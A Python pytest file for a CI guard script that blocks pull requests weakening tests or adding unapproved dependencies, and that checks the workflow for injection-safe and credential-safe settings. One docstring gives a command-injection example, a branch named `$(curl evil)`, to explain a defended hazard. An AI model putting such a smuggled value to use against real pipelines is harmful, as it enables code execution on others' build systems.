"""The agent-forge test-guard, the check that runs in a product repository's CI.

Tested here because this is where the script now lives. It arrived with these tests rather than
without them: the guard is a REQUIRED check on rally's main branch, and a required check nobody
tests is a decoration that blocks merges.

Loaded by path rather than imported. The script ships as a standalone file and runs in repositories
that have never heard of agent-forge, so it must work as a file — and one of the tests below asserts
exactly that by reading its source for platform imports.
"""

from __future__ import annotations

import importlib.util
import pathlib
import subprocess
import sys

import pytest

GUARD_PATH = (
    pathlib.Path(__file__).resolve().parents[1]
    / "actions"
    / "agent-forge-test-guard"
    / "agent_forge_test_guard.py"
)


def _load():  # type: ignore[no-untyped-def]
    spec = importlib.util.spec_from_file_location("agent_forge_test_guard", GUARD_PATH)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


guard = _load()


def _git(cwd: pathlib.Path, *args: str) -> None:
    subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True)


@pytest.fixture
def repo(tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch) -> pathlib.Path:
    """A repository with `main` holding a test file, and a branch checked out on top of it."""
    root = tmp_path / "repo"
    root.mkdir()
    _git(root, "init", "-b", "main")
    _git(root, "config", "user.email", "t@example.invalid")
    _git(root, "config", "user.name", "T")
    (root / "tests").mkdir()
    (root / "tests" / "test_expiry.py").write_text(
        "def test_rejects_expired() -> None:\n"
        "    assert reject('2020-01') is True\n"
        "    assert reject('2099-01') is False\n"
    )
    (root / "requirements.txt").write_text("pytest\n")
    _git(root, "add", "-A")
    _git(root, "commit", "-m", "seed")
    _git(root, "checkout", "-b", "feat/story")
    monkeypatch.chdir(root)
    return root


def _check(body: str = "") -> list[str]:
    return guard.check("main", "HEAD", body)


def _commit(root: pathlib.Path, message: str = "change") -> None:
    _git(root, "add", "-A")
    _git(root, "commit", "-m", message)


# --- the tests must not get weaker -------------------------------------------------

def test_a_change_that_adds_assertions_passes(repo: pathlib.Path) -> None:
    path = repo / "tests" / "test_expiry.py"
    path.write_text(path.read_text() + "    assert reject(None) is False\n")
    _commit(repo)

    assert _check() == []


def test_a_change_that_drops_an_assertion_fails(repo: pathlib.Path) -> None:
    """The failure a diff review misses: three deleted `assert` lines look like every other deleted
    line in a 400-line change."""
    path = repo / "tests" / "test_expiry.py"
    path.write_text("def test_rejects_expired() -> None:\n    assert reject('2020-01') is True\n")
    _commit(repo)

    failures = _check()
    assert len(failures) == 1
    assert "lost 1 assertion" in failures[0]
    assert "test-edit-approved" in failures[0], "the message must say how to proceed"


def test_a_refactor_that_keeps_the_assertions_passes(repo: pathlib.Path) -> None:
    """Renaming a fixture across a test file changes many lines and weakens nothing. A line-count
    guard would block it, and a guard that blocks ordinary work gets switched off."""
    path = repo / "tests" / "test_expiry.py"
    path.write_text(
        "def test_rejects_an_expired_card() -> None:\n"
        "    assert refuse('2020-01') is True\n"
        "    assert refuse('2099-01') is False\n"
    )
    _commit(repo)

    assert _check() == []


def test_deleting_a_test_file_fails(repo: pathlib.Path) -> None:
    (repo / "tests" / "test_expiry.py").unlink()
    _commit(repo)

    failures = _check()
    assert len(failures) == 1
    assert "was deleted" in failures[0]


def test_a_declared_approval_lets_a_test_change_through(repo: pathlib.Path) -> None:
    """ADR-0002 D-8's human half. Sometimes the acceptance test is genuinely wrong, and a check with
    no unlock is a check somebody removes."""
    (repo / "tests" / "test_expiry.py").unlink()
    _commit(repo)

    assert _check("Rewrote the suite.\n\nagent-forge: test-edit-approved — spec changed\n") == []


def test_a_source_file_losing_an_assertion_is_not_the_guard_s_business(
    repo: pathlib.Path,
) -> None:
    """Production code contains assertions too. Flagging those would fire on ordinary refactors and
    teach the team the check is noise."""
    (repo / "checkout.py").write_text("def reject(date):\n    return True\n")
    _commit(repo)
    (repo / "checkout.py").write_text("def reject(date):\n    return False\n")
    _commit(repo)

    assert _check() == []


# --- dependencies ------------------------------------------------------------------

def test_a_manifest_change_without_an_approval_fails(repo: pathlib.Path) -> None:
    (repo / "requirements.txt").write_text("pytest\nrequests\n")
    _commit(repo)

    failures = _check()
    assert len(failures) == 1
    assert "dependency-approved" in failures[0]


def test_a_declared_dependency_passes(repo: pathlib.Path) -> None:
    (repo / "requirements.txt").write_text("pytest\nrequests\n")
    _commit(repo)

    assert _check("Adds retry handling.\n\n- agent-forge: dependency-approved: requests\n") == []


def test_several_packages_can_be_approved_on_one_line(repo: pathlib.Path) -> None:
    (repo / "package.json").write_text('{"dependencies": {"zod": "^3"}}\n')
    _commit(repo)

    assert _check("agent-forge: dependency-approved: zod, date-fns\n") == []


# --- path recognition --------------------------------------------------------------

@pytest.mark.parametrize(
    "path",
    [
        "tests/test_expiry.py",
        "test/checkout_test.go",
        "src/checkout/validate_test.py",
        "web/src/checkout.spec.ts",
        "web/src/checkout.test.tsx",
        "src/java/CheckoutTest.java",
    ],
)
def test_test_files_are_recognised_across_ecosystems(path: str) -> None:
    """The guard ships into repositories the platform has never seen. A convention it does not know
    is a test file it does not protect."""
    assert guard.is_test_file(path)


@pytest.mark.parametrize("path", ["src/checkout.py", "docs/testing.md", "latest.py"])
def test_source_files_are_not_treated_as_tests(path: str) -> None:
    assert not guard.is_test_file(path)


# --- the entry point ---------------------------------------------------------------

def test_the_exit_code_is_what_ci_reads(repo: pathlib.Path, capsys) -> None:  # type: ignore[no-untyped-def]
    (repo / "requirements.txt").write_text("pytest\nrequests\n")
    _commit(repo)

    assert guard.main(["--base", "main", "--head", "HEAD"]) == 1
    assert "test-guard FAILED" in capsys.readouterr().err

    body = repo / "body.txt"
    body.write_text("agent-forge: dependency-approved: requests\n")
    assert guard.main(["--base", "main", "--head", "HEAD", "--body-file", str(body)]) == 0


def test_a_missing_body_file_is_not_an_approval(repo: pathlib.Path) -> None:
    """A body file that failed to materialise must not read as "nothing to declare" — that would
    turn a broken CI step into a silent bypass."""
    (repo / "requirements.txt").write_text("pytest\nrequests\n")
    _commit(repo)

    assert guard.main(["--base", "main", "--head", "HEAD", "--body-file", "/nonexistent"]) == 1


def test_the_guard_needs_no_third_party_import() -> None:
    """It runs in a target repository's CI with nothing installed but a Python interpreter."""
    source = GUARD_PATH.read_text()
    assert "agent_forge" not in source.replace("agent_forge_test_guard", "")
    assert "import requests" not in source
    assert sys.version_info >= (3, 9), "the guard uses no syntax newer than this"


# --- a manifest that changed is not a dependency that arrived ----------------------


def test_a_release_bump_is_not_a_new_dependency(repo: pathlib.Path) -> None:
    """rally's release pull requests failed this check, every single one.

    #494 `chore(release): 0.7.7` touched `package.json`, `CHANGELOG.md` and
    `.release-please-manifest.json`, and was told to declare a dependency it had not added, because
    the check fired on the manifest CHANGING rather than on a dependency arriving. It merged past
    the failure, which is the real damage: a check that cries wolf on every release teaches everyone
    to override it, and then it is overridden on the pull request that mattered.

    The rationale the check prints is "a licence, a maintainer and a transitive tree". A version
    bump of your own package brings none of the three.
    """
    (repo / "package.json").write_text('{"name": "x", "version": "1.0.0", "dependencies": {}}\n')
    _commit(repo, "seed the manifest")
    _git(repo, "checkout", "main")
    _git(repo, "merge", "--ff-only", "feat/story")
    _git(repo, "checkout", "-b", "release/next")
    (repo / "package.json").write_text('{"name": "x", "version": "1.0.1", "dependencies": {}}\n')
    _commit(repo, "chore(release): 1.0.1")

    assert guard.check("main", "HEAD", "chore(release): 1.0.1") == []


def test_a_new_dependency_still_fails_and_is_named(repo: pathlib.Path) -> None:
    """The check must not have been weakened into uselessness by the fix above. It also NAMES the
    package now, which the old message could not: it knew the file had changed and nothing more."""
    (repo / "package.json").write_text(
        '{"name": "x", "dependencies": {"left-pad": "^1.0.0"}}\n'
    )
    _commit(repo, "add a dependency")

    failures = _check()

    assert len(failures) == 1
    assert "left-pad" in failures[0]


def test_removing_a_dependency_needs_no_approval(repo: pathlib.Path) -> None:
    """Approval exists because arriving code carries a licence and a transitive tree. Leaving code
    carries neither, so asking a human to bless a removal is friction that buys nothing."""
    (repo / "requirements.txt").write_text("pytest\nrequests\n")
    _commit(repo, "two dependencies")
    _git(repo, "checkout", "main")
    _git(repo, "merge", "--ff-only", "feat/story")
    _git(repo, "checkout", "-b", "drop/requests")
    (repo / "requirements.txt").write_text("pytest\n")
    _commit(repo, "drop one")

    assert guard.check("main", "HEAD", "") == []


def test_an_unreadable_manifest_still_asks(repo: pathlib.Path) -> None:
    """The conservative fallback, stated rather than silent: for a format this script cannot parse
    it cannot tell a version bump from a new dependency, so it asks — and says that is why."""
    (repo / "pom.xml").write_text("<project><!-- not parsed here --></project>\n")
    _commit(repo, "touch a manifest we cannot read")

    failures = _check()

    assert len(failures) == 1
    assert "cannot read that format" in failures[0]


# --- the workflow that carries it --------------------------------------------------

_ROOT = pathlib.Path(__file__).resolve().parents[1]
WORKFLOW = _ROOT / ".github" / "workflows" / "agent-forge-guard.yml"
ACTION = _ROOT / "actions" / "agent-forge-test-guard" / "action.yml"


def test_the_action_does_not_interpolate_a_branch_name_into_a_shell() -> None:
    """The copied version shipped the vulnerable form for months, and that is why this is shared.

    A branch name is attacker-controlled on a fork pull request, and `${{ }}` expands before the
    shell sees it — so a branch called `$(curl evil)` would execute. rally's copy was fixed when
    zizmor flagged it (#495) and the fix never came back to the canonical template, so every
    repository onboarded after that point would have taken the vulnerable version. Drift with the
    consumer AHEAD of the source is the direction nobody watches for, and one copy is the only real
    answer to it.
    """
    body = ACTION.read_text()

    assert '--base "origin/${BASE_REF}"' in body, "the branch name arrives via the environment"
    assert "origin/${{" not in body, "a branch name interpolated into a shell command"


def test_the_workflow_does_not_leave_a_credential_behind() -> None:
    """The guard reads history and runs a script against attacker-influenced input; it never pushes.
    A persisted checkout credential would be available to everything that runs afterwards."""
    assert "persist-credentials: false" in WORKFLOW.read_text()


def test_the_workflow_checks_out_full_history() -> None:
    """The guard diffs against the merge base, which does not exist in a shallow clone. Without
    this the check does not fail loudly — it compares against the wrong base and reports on a diff
    nobody asked about."""
    assert "fetch-depth: 0" in WORKFLOW.read_text()


def test_the_body_reaches_the_script_as_a_file_not_an_argument() -> None:
    """A pull request body is attacker-controlled text. As an argument a metacharacter in it gets
    interpreted; as a file it is bytes."""
    assert "PR_BODY" in WORKFLOW.read_text(), "arrives through the environment, then written out"
    assert "--body-file" in ACTION.read_text()


def test_the_check_name_is_the_one_branch_protection_already_requires() -> None:
    """GitHub matches required checks by NAME, not by workflow, so `test-guard` is what lets a
    repository switch from its own copy to this one without touching its ruleset. Renaming the job
    silently unblocks every pull request in every consumer: the required check stops reporting and
    a check that never reports is not a check that failed.
    """
    assert "name: test-guard" in WORKFLOW.read_text()


def test_the_workflow_re_runs_when_a_pull_request_body_is_edited() -> None:
    """Approvals are declared in the body, so a repository that omits `edited` leaves an approved
    change with a red tick nobody can clear. The reusable cannot force the caller's trigger list,
    so the requirement is stated where somebody copying the snippet will read it."""
    assert "edited" in WORKFLOW.read_text()
